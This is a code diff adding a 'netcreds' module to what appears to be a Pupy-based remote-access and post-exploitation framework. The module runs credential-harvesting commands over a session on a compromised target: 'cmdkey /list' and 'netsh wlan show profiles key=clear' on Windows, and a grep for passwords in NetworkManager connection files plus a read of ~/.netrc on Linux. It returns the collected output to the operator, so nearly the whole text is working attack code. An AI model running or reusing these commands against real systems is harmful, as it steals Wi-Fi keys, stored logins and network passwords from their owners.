@@ -2422,3 +2422,38 @@ class RwmicModule(PupyModule):
         if not (args.get("target") or args.get("host")):
             return ["Missing required argument: target"]
         return []
+
+
+class NetcredsModule(PupyModule):
+    """Harvest network credentials from the target.
+
+    Upstream Pupy's ``netcreds`` (via netcreds agent module). Native
+    reimplementation using netsh/credman on the host.
+    """
+
+    name = "netcreds"
+    version = "1.0.0"
+    description = "Harvest network credentials from the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session, args):
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = "cmdkey /list 2>nul; netsh wlan show profiles key=clear 2>nul"
+        else:
+            cmd = "grep -r 'password' /etc/NetworkManager/system-connections/ 2>/dev/null; cat ~/.netrc 2>/dev/null"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
